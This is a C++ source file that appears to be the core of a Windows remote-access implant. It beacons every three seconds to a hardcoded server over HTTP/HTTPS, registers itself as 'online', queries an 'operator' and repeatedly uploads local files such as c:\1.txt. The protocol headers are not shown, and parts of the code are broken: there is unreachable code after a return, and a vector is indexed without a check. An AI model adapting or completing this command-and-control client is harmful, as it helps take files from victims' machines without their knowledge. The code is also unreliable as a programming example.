

#include <windows.h>

#include <vector>

#include "public.h"

#include "http.h"

#include "https.h"

#include "uuid.h"
#include "packet.h"

#include "command.h"

#pragma comment(lib,"ws2_32.lib")

using namespace std;

int init() {
	WSAData wsa;

	int ret = 0;
	ret = WSAStartup(0x0202, &wsa);

	g_ip = inet_addr("192.168.231.1");

	g_httpsToggle = TRUE;

	ret = getUUID();

	return ret;
}



int clear() {
	int ret = 0;
	ret = WSACleanup();

	return ret;
}



int mytestfunc() {
	int ret = 0;
	//ret = uploadHttpsFile("test.txt");
//ret = uploadFileTest("test.txt");

	char backdata[MAX_SIZE];

	int backsize = MAX_SIZE;

	HttpsProto https(TRUE);

	ret = https.postCmd(CMD_ONLINE, backdata,&backsize);

	ret = https.postFile("test.txt", backdata, &backsize);

	ret = https.postCmd(CMD_QUERY_OPERATOR, backdata, &backsize);

	return 0;

	HttpProto http(TRUE);

	ret = http.postCmd(CMD_ONLINE, backdata, &backsize);

	ret = http.postFile("test.txt", backdata, &backsize);

	ret = http.postCmd(CMD_QUERY_OPERATOR, backdata, &backsize);

	return ret;
}

int mainProc() {
	int ret = 0;

// 	WCHAR url[1024];
// 	WCHAR wstruuid[256];
// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
// 	WCHAR wstrcmd[256];
// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);

	HttpProto http(FALSE);

	char backdata[MAX_SIZE];

	int backsize = MAX_SIZE;

	ret = http.getSubCmd(CMD_GETHOST,GETHOST_ALLH, backdata, &backsize);

	while (TRUE)
	{
		Sleep(3000);

		vector<CLIENT_INFO>hosts = parseHosts(backdata, backsize);

		int num = 0;

		string host = hosts[0].host;

		//ret = http.getCmd(CMD_QUERY_OPERATOR, backdata, &backsize);

		ret = http.getCmdStr(CMD_SEND_DD_DATA,"c:\\1.txt", backdata, &backsize);
		
	}

	return ret;
}



int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {

	int ret = 0;

	ret = init();

	ret = mainProc();

	ret = clear();

	return 0;
}